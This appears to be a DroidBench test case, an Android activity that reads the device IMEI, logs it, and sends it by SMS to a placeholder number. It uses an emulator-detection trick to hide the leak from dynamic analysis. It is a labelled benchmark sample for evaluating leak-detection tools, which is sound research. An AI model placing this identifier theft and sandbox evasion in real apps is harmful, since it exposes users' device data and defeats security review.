package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.widget.Button;


/**
 * @testcase_name EmulatorDetection_IMEI
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sends the IMEI as an SMS message and writes it to the log file. Emulator detection
 * 		is performed by cutting the secret message at an index computed on the IMEI which is known
 * 		to always be 000..0 on an emulator.
 * @dataflow onCreate: imei -> SMS & Log 
 * @number_of_leaks 2
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				String imei = telephonyManager.getDeviceId(); //source
				String suffix = "000000000000000";
				String prefix = "secret";
				String msg = prefix + suffix;

				int zeroPos = 0;
				while (zeroPos < imei.length()) {
					if (imei.charAt(zeroPos) == '0')
						zeroPos++;
					else {
						zeroPos = 0;
						break;
					}
				}

				String newImei = msg.substring(zeroPos, zeroPos + Math.min(prefix.length(), msg.length() - 1));
				Log.d("DROIDBENCH", newImei);

				SmsManager sm = SmsManager.getDefault();
				sm.sendTextMessage("+49 123", null, newImei, null, null); //sink, potential leak
			}
		});


	}
	
}
